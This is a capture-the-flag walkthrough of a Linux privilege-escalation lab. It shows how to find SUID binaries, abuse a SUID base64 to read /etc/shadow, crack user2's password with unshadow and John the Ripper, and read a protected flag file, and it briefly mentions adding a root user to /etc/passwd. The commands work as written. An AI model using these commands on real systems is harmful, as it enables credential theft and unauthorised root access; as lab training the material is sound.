# SUID

This section focuses on Linux privilege escalation through the manipulation of file permissions, specifically using SUID (Set-user ID) and SGID (Set-group ID) bits. Here are the key points:

1. **Understanding Permissions**: Linux controls user interactions with files through permissions (read, write, execute). The SUID and SGID bits allow users to execute files with the permissions of the file owner or group owner, respectively.
2.  **Identifying SUID/SGID Files**: You can find files with SUID or SGID bits set using the command:

    ```
    CodeCopy Codefind / -type f -perm -04000 -ls 2>/dev/null
    ```

    This command lists files that have special permissions, which can be potential vectors for privilege escalation.
3. **Using GTFOBins**: It’s recommended to compare the identified executables with [GTFOBins](https://gtfobins.github.io/), a resource that lists binaries that can be exploited when the SUID bit is set. This can help identify potential vulnerabilities.
4. **Example with Nano**: The lesson highlights that the `nano` text editor has the SUID bit set, allowing users to read and edit files with root privileges. This can be leveraged for privilege escalation.
5. **Privilege Escalation Methods**:
   * **Reading /etc/shadow**: By using `nano /etc/shadow`, you can access the contents of the shadow file, which contains hashed passwords. You can then use the `unshadow` tool to combine it with `/etc/passwd` for password cracking with tools like John the Ripper.
   * **Adding a New User**: Alternatively, you can create a new user with root privileges by adding an entry to `/etc/passwd`. This involves generating a password hash using a tool like OpenSSL and then adding the user with the desired privileges.



### Which user shares the name of a great comic book writer?

**Step 1: Examine the /etc/passwd file**

Use the command:

```bash
cat /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

### What is the password of user2?

We already have the /etc/passwd file, but now we need to SUID to elevate the privileges in order to copy the /etc/shadow.

**Step 1: List the SUID or SGID bits set**

List the SUID files with the command:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

We'll use the `/usr/bin/base64.` Let's check the GTFObins for the SUID bit set of base64.

<figure><img src="../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

Instead of **./base64**, lets use **/usr/bin/base64** like the command bellow. This allows to run from every directory:

```bash
LFILE=/etc/shadow
/usr/bin/base64 "$LFILE" | base64 --decode
```

<figure><img src="../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

**Step 2: Crack the user2's password**

Copy both **/etc/passwd** and **/etc/shadow** to the target machine.

Let's use unshadow to create a crakable file for John the Ripper

<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

With both files in the same directory run the following command:

```bash
unshadow passwd.txt shadow.txt > passwords.txt
```

And then use John the Ripper to Crack the hash:

```bash
john passwords.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

### What is the content of the flag3.txt file?

**Step1: Login with user2**

```bash
su user2
```

<figure><img src="../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

**Step2: Look for the flag**

Move to the /home/ubuntu and try to see the content of flag3.txt

```bash
cd /home/ubuntu
cat flag3.txt
```

<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

We still don't have enough privileges. Let's try the same technique used with the user karen

**Step2: Use the base64 SUID**

As we did before, execute the following commands but now specifing the **flag3.txt**:

```
LFILE=/home/ubuntu/flag3.txt
/usr/bin/base64 "$LFILE" | base64 --decode
```

<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

And we successfuly retrieve the flag!
